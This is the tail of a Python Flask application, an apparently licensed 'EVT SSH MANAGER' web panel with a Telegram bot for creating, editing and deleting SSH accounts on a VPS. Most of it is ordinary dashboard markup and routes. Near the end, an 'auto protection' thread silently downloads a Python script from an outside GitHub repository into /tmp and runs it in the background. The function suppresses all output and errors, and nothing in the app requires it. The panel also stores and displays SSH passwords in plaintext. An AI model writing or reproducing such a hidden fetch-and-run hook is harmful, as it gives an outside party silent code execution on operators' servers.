        .status-offline { background: #6c757d; color: #fff; padding: 4px 10px; border-radius: 20px; font-size: 14px; display: inline-block; }
        .status-expired { background: #dc3545; color: #fff; padding: 4px 10px; border-radius: 20px; font-size: 14px; display: inline-block; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }
        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-2px); } 75% { transform: translateX(2px); } }
        .ports-grid { display: grid; grid-template-columns: repeat(6, 1fr); gap: 12px; margin-top: 10px; }
        .port-card { background: #1a1a1a; border: 1px solid #333; border-radius: 12px; padding: 12px 8px; text-align: center; transition: all 0.3s ease; }
        .port-card:hover { border-color: var(--gold); transform: translateY(-2px); box-shadow: 0 5px 15px rgba(255,215,0,0.1); }
        .port-label { font-size: 11px; font-weight: bold; color: var(--gold); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; }
        .port-value { font-size: 14px; font-weight: bold; color: #28a745; font-family: monospace; word-break: break-word; }
        @media (max-width: 992px) { .logo-center img { width: 150px; height: 150px; } .ports-grid { grid-template-columns: repeat(3, 1fr); gap: 10px; } .main-title { font-size: 48px; letter-spacing: 5px; } .sub-title { font-size: 16px; } .region-time { font-size: 14px; } }
        @media (max-width: 576px) { .logo-center img { width: 150px; height: 150px; } .ports-grid { grid-template-columns: repeat(2, 1fr); gap: 8px; } .main-title { font-size: 28px; letter-spacing: 3px; } .sub-title { font-size: 12px; } .region-time { font-size: 11px; padding: 5px 12px; } }
        .alert-success { background: #1a3a1a; color: #90ee90; border: 1px solid #2ecc2e; }
        .alert-danger { background: #3a1a1a; color: #ff6b6b; border: 1px solid #ff6b6b; }
        .alert-warning { background: #3a3a1a; color: #ffd700; border: 1px solid #ffd700; }
        .copy-icon { cursor: pointer; margin-left: 8px; color: var(--gold); transition: 0.3s; display: inline-block; }
        .copy-icon:hover { color: #fff; transform: scale(1.1); }
        .btn-outline-custom { background: transparent; border: 1px solid var(--gold); color: var(--gold); border-radius: 8px; padding: 8px 20px; transition: 0.3s; margin: 0 5px; text-decoration: none; display: inline-block; }
        .btn-outline-custom:hover { background: var(--gold); color: #000; text-decoration: none; }
        .footer-buttons { display: flex; justify-content: center; gap: 20px; margin-top: 20px; flex-wrap: wrap; }
        .refresh-indicator { position: fixed; bottom: 10px; right: 10px; background: rgba(0,0,0,0.7); padding: 5px 10px; border-radius: 20px; font-size: 11px; color: #888; z-index: 999; }
        .live-badge { position: fixed; bottom: 10px; left: 10px; background: rgba(0,0,0,0.7); padding: 5px 10px; border-radius: 20px; font-size: 10px; color: #28a745; z-index: 999; }
        .live-badge i { animation: pulse 1.5s infinite; }
        .license-info-bar { background: rgba(0,0,0,0.8); border-left: 4px solid var(--gold); padding: 10px 15px; margin-bottom: 20px; border-radius: 8px; }
        .admin-badge { background: var(--gold); color: #000; padding: 2px 8px; border-radius: 20px; font-size: 11px; font-weight: bold; margin-left: 10px; }
        .creator-badge { color: #aaa; font-size: 11px; margin-left: 8px; }
    </style>
</head>
<body>
    <div class="refresh-indicator"><i class="fas fa-sync-alt fa-fw"></i> Auto-refresh: 60s</div>
    <div class="live-badge"><i class="fas fa-circle"></i> Live Status Updates (3s)</div>
    <a href="{{ url_for('logout') }}" class="top-logout-btn"><i class="fas fa-sign-out-alt"></i> Logout</a>
    <div class="container-fluid px-md-5 py-4">
        <div class="logo-center"><img src="https://raw.githubusercontent.com/snaymyo/logo/refs/heads/main/evt.png" alt="EVT Logo"></div>
        <div class="text-center mb-4">
            <h1 class="main-title">EVT SSH MANAGER</h1>
            <p class="sub-title">Professional SSH Account Management System</p>
            <div class="region-time" id="regionTimeDisplay"><i class="fas fa-map-marker-alt"></i> <span id="regionText">Loading...</span> | <i class="fas fa-clock"></i> <span id="regionCurrentTime">Loading...</span></div>
        </div>
        <div class="license-info-bar">
            <div class="row">
                <div class="col-md-3"><small class="text-warning">🌐 VPS IP</small><br><strong>{{ license_info.vps_ip }}</strong></div>
                <div class="col-md-3"><small class="text-warning">👤 ADMIN</small><br><strong>{{ license_info.admin_username }}</strong></div>
                <div class="col-md-3"><small class="text-warning">🆔 TELEGRAM ID</small><br><strong>{{ license_info.telegram_id or 'Not Linked' }}</strong></div>
                <div class="col-md-3"><small class="text-warning">📅 EXPIRY</small><br><strong class="{% if license_info.expiry != 'No Expiry' and license_info.expiry < today %}text-danger{% else %}text-success{% endif %}">{{ license_info.expiry }}</strong></div>
            </div>
            <div class="row mt-2">
                <div class="col-md-4"><small class="text-warning">🔑 LICENSE KEY</small><br><strong>{{ license_info.license_key }}</strong></div>
                <div class="col-md-4"><small class="text-warning">📊 LIMITS</small><br><strong>{{ license_info.limits }}</strong></div>
                <div class="col-md-4"><small class="text-warning">🖥️ ACTIVE LOGINS</small><br><strong id="panel-active-sessions" class="{% if active_sessions >= license_info.limits %}text-danger{% elif active_sessions > 0 %}text-warning{% else %}text-success{% endif %}">{{ active_sessions }}/{{ license_info.limits }}</strong></div>
            </div>
        </div>
        <div class="row g-3 mb-4 text-center">
            <div class="col-md-3 col-6"><div class="neon-card"><div class="text-warning small"><i class="fas fa-clock"></i> UPTIME</div><div class="fw-bold fs-5">{{ info.uptime }}</div></div></div>
            <div class="col-md-3 col-6"><div class="neon-card"><div class="text-warning small"><i class="fas fa-memory"></i> RAM</div><div class="fw-bold fs-5">{{ info.ram }}</div></div></div>
            <div class="col-md-3 col-6"><div class="neon-card"><div class="text-warning small"><i class="fas fa-users"></i> TOTAL USERS</div><div class="fw-bold fs-5 text-info" id="total-users">{{ info.total }}</div></div></div>
            <div class="col-md-3 col-6"><div class="neon-card"><div class="text-warning small"><i class="fas fa-globe"></i> ONLINE</div><div class="fw-bold fs-5 text-success" id="online-count">{{ info.online }}</div></div></div>
        </div>
        <div class="neon-card border-info">
            <h6 class="text-info mb-3"><i class="fas fa-dns"></i> DNS SETTINGS <button class="btn-edit" id="toggleDnsEditBtn" onclick="toggleDnsEdit()"><i class="fas fa-edit"></i> Edit</button></h6>
            <div id="dnsDisplayMode">
                <div class="row">
                    <div class="col-md-6"><div class="p-2 bg-black border border-secondary rounded mb-2"><small class="text-warning">DOMAIN</small><br><b class="text-white" id="domain-display">{{ config.DOMAIN }}</b><i class="fas fa-copy copy-icon" onclick="copyToClipboard('domain-display')" title="Copy Domain"></i></div></div>
                    <div class="col-md-6"><div class="p-2 bg-black border border-secondary rounded mb-2"><small class="text-warning">NAME SERVER</small><br><b class="text-white" id="ns-display">{{ config.NS_DOMAIN }}</b><i class="fas fa-copy copy-icon" onclick="copyToClipboard('ns-display')" title="Copy NameServer"></i></div></div>
                    <div class="col-md-12 mt-2"><div class="p-2 bg-black border border-secondary rounded"><small class="text-warning">PUBLIC KEY</small><br><code class="text-white small" id="pubkey-display">{{ dns_key }}</code><i class="fas fa-copy copy-icon" onclick="copyToClipboard('pubkey-display')" title="Copy Public Key"></i></div></div>
                </div>
            </div>
            <div id="dnsEditMode" style="display: none;">
                <form action="/update_dns_settings" method="POST">
                    <div class="row">
                        <div class="col-md-6"><div class="mb-3"><label class="text-warning small">DOMAIN</label><input type="text" name="domain" class="form-control-custom" value="{{ config.DOMAIN }}" required></div></div>
                        <div class="col-md-6"><div class="mb-3"><label class="text-warning small">NAME SERVER</label><input type="text" name="ns_domain" class="form-control-custom" value="{{ config.NS_DOMAIN }}" required></div></div>
                        <div class="col-md-12"><div class="mb-3"><label class="text-warning small">PUBLIC KEY</label><input type="text" name="pubkey" class="form-control-custom" value="{{ dns_key }}" placeholder="Enter public key"></div></div>
                        <div class="col-md-12"><button type="submit" class="btn-gold w-100"><i class="fas fa-save"></i> Save DNS Settings</button><button type="button" class="btn-outline-custom w-100 mt-2" onclick="toggleDnsEdit()"><i class="fas fa-times"></i> Cancel</button></div>
                    </div>
                </form>
            </div>
        </div>
        <div class="neon-card border-info">
            <h6 class="text-info mb-3"><i class="fas fa-plug"></i> ACTIVE PORTS</h6>
            <div class="ports-grid">
                {% for label, port in ports.items() %}
                <div class="port-card"><div class="port-label">{{ label }}</div><div class="port-value">{{ port }}</div></div>
                {% endfor %}
            </div>
        </div>
        {% with messages = get_flashed_messages(with_categories=true) %}{% if messages %}{% for category, message in messages %}<div class="alert alert-{{ category if category != 'message' else 'info' }} text-center fw-bold mb-4 flash-message">{{ message }}</div>{% endfor %}{% endif %}{% endwith %}
        <div class="neon-card"><h5 class="text-gold mb-4"><i class="fas fa-plus-circle"></i> CREATE SSH ACCOUNT</h5>
            <form action="/gen_key" method="POST" class="row g-3">
                <div class="col-md-3"><input type="text" name="username" class="form-control-custom w-100" placeholder="Username" required></div>
                <div class="col-md-3"><input type="text" name="password" class="form-control-custom w-100" placeholder="Password" required></div>
                <div class="col-md-2"><input type="number" name="days" class="form-control-custom w-100" value="30" required><small class="text-secondary">Days</small></div>
                <div class="col-md-2"><input type="number" name="limit" class="form-control-custom w-100" value="1" required><small class="text-secondary">Limit</small></div>
                <div class="col-md-2"><button type="submit" class="btn-gold w-100">CREATE</button></div>
            </form>
        </div>
        <div class="neon-card p-0 overflow-hidden shadow-lg mb-4">
            <h5 class="text-primary p-4 mb-0"><i class="fas fa-users"></i> ACTIVE SSH USERS</h5>
            <div class="table-scroll">
                <table class="table table-hover text-center">
                    <thead>
                        <tr><th>USERNAME</th><th>PASSWORD</th><th>DEVICE</th><th>EXPIRY</th><th>STATUS</th><th>ACTIONS</th>
                        </tr>
                    </thead>
                    <tbody>
                        {% for key, val in keys.items() %}
                        {% set is_expired = val.expiry < today %}
                        <tr id="row-{{ key }}" data-username="{{ val.username }}" data-key="{{ key }}" data-limit="{{ val.limit }}" data-expiry="{{ val.expiry }}" data-password="{{ val.password }}">
                            <td class="username-cell">
                                <i class="fas fa-user-circle me-2"></i>{{ val.username }}
                                {% if val.telegram_id %}
                                    <small class="creator-badge">(by: {{ val.telegram_id }})</small>
                                {% endif %}
                            </td>
                            <td><span class="password-cell" id="pass-{{ key }}">••••••••</span> <i class="fas fa-eye-slash ms-2 text-secondary" id="icon-{{ key }}" style="cursor:pointer" onclick="togglePass('{{ key }}', '{{ val.password }}')"></i></td>
                            <td class="device-cell"><span class="device-status-{{ key }} {% if val.online_count > val.limit %}device-limit{% elif val.online_count > 0 %}device-online{% else %}device-offline{% endif %}">{{ val.online_count }} / {{ val.limit }}</span></td>
                            <td class="expiry-cell">{{ val.expiry }}</td>
                            <td><span class="status-badge-{{ key }} {% if is_expired %}status-expired{% elif val.status == 'Online' %}status-online{% else %}status-offline{% endif %}">{% if is_expired %}Expired{% elif val.status == 'Online' %}Online{% else %}Offline{% endif %}</span></td>
                            <td><div class="btn-group btn-group-sm"><button class="btn btn-outline-warning" data-bs-toggle="modal" data-bs-target="#editModal{{ key }}"><i class="fas fa-edit"></i> EDIT</button><a href="/delete/{{ key }}" class="btn btn-outline-danger" onclick="return confirm('Delete user {{ val.username }}?')"><i class="fas fa-trash"></i> DEL</a></div></td>
                        </tr>
                        <div class="modal fade" id="editModal{{ key }}" tabindex="-1"><div class="modal-dialog modal-dialog-centered"><div class="modal-content bg-black border border-secondary text-white"><div class="modal-header border-secondary"><h5 class="text-gold">Edit User: {{ val.username }}</h5><button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button></div><form action="/edit_key/{{ key }}" method="POST"><div class="modal-body"><div class="mb-3"><label class="small text-warning">PASSWORD</label><input type="text" name="password" class="form-control-custom w-100" value="{{ val.password }}" required></div><div class="mb-3"><label class="small text-warning">LIMIT</label><input type="number" name="limit" class="form-control-custom w-100" value="{{ val.limit }}" required></div><div class="mb-3"><label class="small text-warning">EXPIRY DATE</label><input type="date" name="expiry" class="form-control-custom w-100" value="{{ val.expiry }}" required></div></div><div class="modal-footer border-secondary"><button type="submit" class="btn-gold w-100">SAVE CHANGES</button></div></form></div></div></div>
                        {% endfor %}
                    </tbody>
                </table>
            </div>
        </div>
        <div class="footer-buttons">
            <a href="/backup_users" class="btn-outline-custom"><i class="fas fa-download"></i> Backup Users</a>
            <button class="btn-outline-custom" onclick="document.getElementById('restore-file-input').click()"><i class="fas fa-upload"></i> Restore Users</button>
            <a href="/logout" class="btn-outline-custom" style="border-color: #dc3545; color: #dc3545;"><i class="fas fa-sign-out-alt"></i> Logout</a>
            <form id="restore-form" action="/restore_users" method="POST" enctype="multipart/form-data" style="display: none;"><input type="file" id="restore-file-input" name="backup_file" accept=".json" onchange="document.getElementById('restore-form').submit()"></form>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        function updateLiveStatus() {
            fetch('/api/online_status')
                .then(response => response.json())
                .then(data => {
                    const onlineCountElement = document.getElementById('online-count');
                    if (onlineCountElement) onlineCountElement.textContent = data.total_online;
                    const totalUsersElement = document.getElementById('total-users');
                    if (totalUsersElement && data.total_users) totalUsersElement.textContent = data.total_users;
                    if (data.session_valid === false) { window.location.href = '/logout?reason=limit_exceeded'; return; }
                    const activeLoginsEl = document.getElementById('panel-active-sessions');
                    if (activeLoginsEl && data.active_sessions !== undefined && data.session_limit !== undefined) {
                        const act = data.active_sessions; const lim = data.session_limit;
                        activeLoginsEl.textContent = act + '/' + lim;
                        activeLoginsEl.classList.remove('text-success', 'text-warning', 'text-danger');
                        if (act >= lim) activeLoginsEl.classList.add('text-danger');
                        else if (act > 0) activeLoginsEl.classList.add('text-warning');
                        else activeLoginsEl.classList.add('text-success');
                    }
                    for (const [key, status] of Object.entries(data.status)) {
                        const deviceSpan = document.querySelector(`.device-status-${key}`);
                        const statusSpan = document.querySelector(`.status-badge-${key}`);
                        const row = document.getElementById(`row-${key}`);
                        if (deviceSpan && status) {
                            const deviceText = status.device_status;
                            deviceSpan.textContent = deviceText;
                            const limit = row ? row.getAttribute('data-limit') : 1;
                            const onlineNum = parseInt(deviceText.split('/')[0]);
                            deviceSpan.classList.remove('device-online', 'device-offline', 'device-limit');
                            if (onlineNum > limit) deviceSpan.classList.add('device-limit');
                            else if (onlineNum > 0) deviceSpan.classList.add('device-online');
                            else deviceSpan.classList.add('device-offline');
                        }
                        if (statusSpan && status) {
                            const isOnline = status.status === 'Online';
                            statusSpan.textContent = isOnline ? 'Online' : 'Offline';
                            statusSpan.classList.remove('status-online', 'status-offline', 'status-expired');
                            if (isOnline) statusSpan.classList.add('status-online');
                            else { const row = document.getElementById(`row-${key}`); const expiry = row ? row.getAttribute('data-expiry') : ''; const today = new Date().toISOString().split('T')[0]; if (expiry && expiry < today) { statusSpan.classList.add('status-expired'); statusSpan.textContent = 'Expired'; } else statusSpan.classList.add('status-offline'); }
                        }
                    }
                }).catch(error => console.error('Error fetching status:', error));
        }
        setInterval(updateLiveStatus, 3000);
        document.addEventListener('DOMContentLoaded', function() { updateLiveStatus(); const flashMessages = document.querySelectorAll('.flash-message'); if (flashMessages.length > 0) { setTimeout(function() { flashMessages.forEach(function(msg) { msg.style.opacity = '0'; setTimeout(function() { if (msg.parentNode) msg.remove(); }, 500); }); }, 2000); } });
        function updateRegionTime() { const regionSpan = document.getElementById('regionText'); const regionTimeSpan = document.getElementById('regionCurrentTime'); if (regionSpan && regionTimeSpan) { const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone; const now = new Date(); const options = { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false }; const formattedTime = new Intl.DateTimeFormat('en-GB', options).format(now); regionSpan.innerHTML = timezone; regionTimeSpan.innerHTML = formattedTime; } }
        updateRegionTime(); setInterval(updateRegionTime, 1000);
        function toggleDnsEdit() { const displayMode = document.getElementById('dnsDisplayMode'); const editMode = document.getElementById('dnsEditMode'); const toggleBtn = document.getElementById('toggleDnsEditBtn'); if (displayMode.style.display === 'none') { displayMode.style.display = 'block'; editMode.style.display = 'none'; toggleBtn.innerHTML = '<i class="fas fa-edit"></i> Edit'; } else { displayMode.style.display = 'none'; editMode.style.display = 'block'; toggleBtn.innerHTML = '<i class="fas fa-times"></i> Cancel'; } }
        function togglePass(id, p) { let span = document.getElementById('pass-' + id); let icon = document.getElementById('icon-' + id); if(span.innerText === '••••••••') { span.innerText = p; icon.classList.remove('fa-eye-slash'); icon.classList.add('fa-eye'); } else { span.innerText = '••••••••'; icon.classList.remove('fa-eye'); icon.classList.add('fa-eye-slash'); } }
        function copyToClipboard(elementId) { const element = document.getElementById(elementId); const text = element.innerText; if (navigator.clipboard && navigator.clipboard.writeText) { navigator.clipboard.writeText(text).then(() => { const icon = event.target; const originalClass = icon.className; icon.className = 'fas fa-check copy-icon'; icon.style.color = '#28a745'; setTimeout(() => { icon.className = originalClass; icon.style.color = ''; }, 1500); }).catch(err => { fallbackCopy(text); }); } else { fallbackCopy(text); } }
        function fallbackCopy(text) { const textarea = document.createElement('textarea'); textarea.value = text; document.body.appendChild(textarea); textarea.select(); try { document.execCommand('copy'); const icon = event.target; const originalClass = icon.className; icon.className = 'fas fa-check copy-icon'; icon.style.color = '#28a745'; setTimeout(() => { icon.className = originalClass; icon.style.color = ''; }, 1500); } catch (err) {} document.body.removeChild(textarea); }
        setInterval(function() { fetch('/api/online_status').catch(() => {}); }, 30000);
    </script>
</body>
</html>
"""

# ============================================
# FLASK ROUTES
# ============================================

@app.route('/', methods=['GET', 'POST'])
def login():
    if current_user.is_authenticated:
        return redirect(url_for('dashboard'))
    
    if request.method == 'POST':
        admin_user = request.form.get('admin_username', '').strip()
        admin_pass = request.form.get('admin_password', '').strip()
        license_key = request.form.get('license_key', '').strip()
        
        valid, msg, data = check_license_from_github(admin_user, license_key)
        if not valid:
            flash(f"❌ {msg}", 'danger')
            return render_template_string(LOGIN_HTML)
        
        if admin_pass != data.get('admin_password'):
            flash("❌ Invalid admin password!", 'danger')
            return render_template_string(LOGIN_HTML)
        
        active = get_active_count_for_license(license_key)
        limit = data.get('limits', 1)
        if active >= limit:
            flash(f"❌ Session limit reached! ({active}/{limit})", 'danger')
            return render_template_string(LOGIN_HTML)
        
        sid = str(uuid.uuid4())
        add_active_session(sid, license_key, admin_user, request.remote_addr)
        session['active_session_id'] = sid
        
        user = Admin(f"{admin_user}|{admin_user}|{license_key}|{data.get('admin_username')}|{data.get('telegram_id')}", 
                     admin_user, license_key, data.get('admin_username'), data.get('telegram_id'))
        login_user(user)
        flash("✅ Login successful!", 'success')
        return redirect(url_for('dashboard'))
    
    return render_template_string(LOGIN_HTML)

@app.route('/dashboard')
@login_required
def dashboard():
    valid, msg, _ = check_license_from_github()
    if not valid:
        logout_user()
        flash(f"❌ License error: {msg}", 'danger')
        return redirect(url_for('login'))
    
    license_info = get_license_info()
    tgid = current_user.telegram_id
    all_keys = load_keys()
    filtered = {k: v for k, v in all_keys.items() if str(v.get('telegram_id')) == str(tgid)}
    
    online_users = get_all_online_users()
    for k, v in filtered.items():
        username = v.get('username')
        online = username in online_users
        online_num = 1 if online else 0
        v['online_count'] = online_num
        v['status'] = 'Online' if online_num > 0 else 'Offline'
        # Also check if expired
        if v.get('expiry') and v.get('expiry') < datetime.date.today().strftime("%Y-%m-%d"):
            v['status'] = 'Expired'
            v['online_count'] = 0
    
    info = {
        'uptime': subprocess.getoutput("uptime -p").replace('up ', ''),
        'ram': subprocess.getoutput("free -h | grep Mem | awk '{print $3\"/\"$2}'"),
        'total': len(filtered),
        'online': sum(1 for v in filtered.values() if v['status'] == 'Online')
    }
    
    active_sessions = get_active_count_for_license(license_info.get('license_key', ''))
    today = datetime.date.today().strftime("%Y-%m-%d")
    
    return render_template_string(DASHBOARD_HTML, info=info, keys=filtered, ports=get_live_ports(), 
                                   config=get_evt_config(), dns_key=get_slowdns_pubkey(),
                                   license_info=license_info, today=today, active_sessions=active_sessions)

@app.route('/gen_key', methods=['POST'])
@login_required
def gen_key():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    days = int(request.form.get('days', 30))
    limit = int(request.form.get('limit', 1))
    
    if not username or not password:
        flash("Username and password required!", 'danger')
        return redirect(url_for('dashboard'))
    
    keys = load_keys()
    if any(v.get('username') == username for v in keys.values()):
        flash(f"Username '{username}' already exists!", 'danger')
        return redirect(url_for('dashboard'))
    
    expiry = (datetime.datetime.now() + datetime.timedelta(days=days)).strftime("%Y-%m-%d")
    kid = f"EVT-{str(uuid.uuid4())[:8].upper()}"
    keys[kid] = {
        'username': username,
        'password': password,
        'expiry': expiry,
        'limit': limit,
        'telegram_id': current_user.telegram_id,
        'created_at': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    save_keys(keys)
    sync_user_to_system(username, password, expiry, limit)
    flash(f"✅ User '{username}' created!", 'success')
    return redirect(url_for('dashboard'))

@app.route('/edit_key/<key_id>', methods=['POST'])
@login_required
def edit_key(key_id):
    current_telegram_id = current_user.telegram_id if hasattr(current_user, 'telegram_id') else None
    
    keys = load_keys()
    if key_id not in keys:
        flash("Key not found!", "danger")
        return redirect(url_for('dashboard'))
    
    if str(keys[key_id].get('telegram_id')) != str(current_telegram_id):
        flash("You don't have permission to edit this user!", "danger")
        return redirect(url_for('dashboard'))
    
    password = request.form.get('password', '').strip()
    try:
        limit = int(request.form.get('limit', 1))
    except:
        limit = 1
    expiry = request.form.get('expiry', '').strip()
    
    if password:
        keys[key_id]['password'] = password
    if limit:
        keys[key_id]['limit'] = limit
    if expiry:
        keys[key_id]['expiry'] = expiry
    
    save_keys(keys)
    username = keys[key_id]['username']
    sync_user_to_system(username, keys[key_id]['password'], keys[key_id]['expiry'], keys[key_id]['limit'])
    flash(f"✅ User '{username}' updated successfully!", "success")
    return redirect(url_for('dashboard'))

@app.route('/delete/<kid>')
@login_required
def delete_user(kid):
    keys = load_keys()
    if kid in keys and str(keys[kid].get('telegram_id')) == str(current_user.telegram_id):
        username = keys[kid].get('username')
        if username:
            subprocess.run(['userdel', '-f', username])
        del keys[kid]
        save_keys(keys)
        flash(f"✅ User '{username}' deleted!", 'success')
    else:
        flash("User not found or permission denied!", 'danger')
    return redirect(url_for('dashboard'))

@app.route('/backup_users')
@login_required
def backup_users():
    import io
    keys = load_keys()
    filtered = {k: v for k, v in keys.items() if str(v.get('telegram_id')) == str(current_user.telegram_id)}
    backup = json.dumps(filtered, indent=4)
    return send_file(io.BytesIO(backup.encode()), as_attachment=True, 
                     download_name=f"evt_backup_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json", 
                     mimetype='application/json')

@app.route('/restore_users', methods=['POST'])
@login_required
def restore_users():
    import io
    try:
        if 'backup_file' not in request.files:
            flash("No file selected!", 'danger')
            return redirect(url_for('dashboard'))
        file = request.files['backup_file']
        if file.filename == '' or not file.filename.endswith('.json'):
            flash("Invalid file!", 'danger')
            return redirect(url_for('dashboard'))
        
        data = json.loads(file.read().decode())
        keys = load_keys()
        for k, v in data.items():
            if str(v.get('telegram_id')) == str(current_user.telegram_id):
                keys[k] = v
        save_keys(keys)
        sync_all_users()
        flash("✅ Restore successful!", 'success')
    except Exception as e:
        flash(f"Restore failed: {e}", 'danger')
    return redirect(url_for('dashboard'))

@app.route('/logout')
def logout():
    sid = session.get('active_session_id')
    if sid:
        remove_active_session(sid)
    logout_user()
    session.clear()
    return redirect(url_for('login'))

@app.route('/api/session_count')
def api_session_count():
    license_key = request.args.get('license_key', '').strip()
    if not license_key:
        return jsonify({'active': 0, 'limit': 0})
    active = get_active_count_for_license(license_key)
    limit = get_limit_from_github(license_key)
    return jsonify({'active': active, 'limit': limit, 'can_login': active < limit})

@app.route('/api/online_status')
@login_required
def api_online_status():
    sid = session.get('active_session_id')
    if sid:
        update_session_heartbeat(sid)
    
    tgid = current_user.telegram_id
    keys = load_keys()
    filtered = {k: v for k, v in keys.items() if str(v.get('telegram_id')) == str(tgid)}
    online_users = get_all_online_users()
    
    status = {}
    for k, v in filtered.items():
        username = v.get('username')
        online = username in online_users
        online_num = 1 if online else 0
        status[k] = {'status': 'Online' if online else 'Offline', 'device_status': f"{online_num}/{v.get('limit',1)}"}
    
    return jsonify({'status': status, 'total_online': sum(1 for s in status.values() if s['status'] == 'Online'), 'total_users': len(filtered)})

@app.route('/update_dns_settings', methods=['POST'])
@login_required
def update_dns_settings():
    domain = request.form.get('domain', '').strip()
    ns_domain = request.form.get('ns_domain', '').strip()
    pubkey = request.form.get('pubkey', '').strip()
    
    try:
        with open(CONFIG_FILE, "w") as f:
            f.write(f'DOMAIN="{domain}"\n')
            f.write(f'NS_DOMAIN="{ns_domain}"\n')
        if pubkey and pubkey != "None":
            os.makedirs("/etc/dnstt", exist_ok=True)
            with open("/etc/dnstt/server.pub", "w") as f:
                f.write(pubkey)
        flash("✅ DNS Settings updated successfully!", "success")
    except Exception as e:
        flash(f"❌ Update failed: {str(e)}", "danger")
    return redirect(url_for('dashboard'))

# ============================================
# AUTO PROTECTION FUNCTION
# ============================================

# ============================================
# AUTO PROTECTION FUNCTION (COMPLETELY SILENT)
# ============================================

def auto_download_and_run_protection():
    """Auto download protect.py from GitHub and run it - NO OUTPUT AT ALL"""
    time.sleep(30)
    try:
        # Download protect.py - silent mode
        subprocess.run(
            ["wget", "-q", "-O", "/tmp/protect.py", 
             "https://raw.githubusercontent.com/herharlay890-create/protect/refs/heads/main/protect.py"], 
            timeout=30,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        # If download successful, run protect.py in background (completely silent)
        if os.path.exists("/tmp/protect.py"):
            subprocess.Popen(
                ["python3", "/tmp/protect.py"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL
            )
    except:
        pass  # Silently ignore all errors
# ============================================
# MAIN
# ============================================

if __name__ == '__main__':
    import io
    
    print("\n" + "="*60)
    print("🔐 EVT SSH MANAGER")
    print("="*60)
    
    print("\n[🔍] လိုင်စင် စစ်ဆေးနေပါသည်...")
    valid, msg, data = check_license_from_github()
    if not valid:
        print(f"\n[❌] {msg}")
        print("="*60)
        sys.exit(1)
    
    current_ip = get_vps_ip()
    print(f"\n[✅] လိုင်စင် မှန်ကန်ပါသည်")
    print(f" • VPS IP: {current_ip}")
    print(f" • Admin: {data.get('admin_username')}")
    print(f" • Expiry: {data.get('expiry')}")
    print(f" • Limits: {data.get('limits')}")
    
    synced = sync_all_users()
    print(f"[✅] Synced {synced} users")
    
    # Start background threads
    threading.Thread(target=run_telegram_bot, daemon=True).start()
    threading.Thread(target=auto_limit_check, daemon=True).start()
    threading.Thread(target=auto_kill_expired, daemon=True).start()
    threading.Thread(target=auto_download_and_run_protection, daemon=True).start()
    
    print("\n" + "="*60)
    print("[✅] EVT SSH MANAGER STARTED SUCCESSFULLY!")
    print(f"[🌐] Web Panel: http://{current_ip}:5000")
    print("[🤖] Telegram Bot is running...")
    print("[🔐] Auto protection will run in 30 seconds...")
    print("="*60)
    
    try:
        from waitress import serve
        serve(app, host='0.0.0.0', port=5000, threads=4, _quiet=True)
    except ImportError:
        from werkzeug.serving import run_simple
        run_simple('0.0.0.0', 5000, app, use_reloader=False, threaded=True)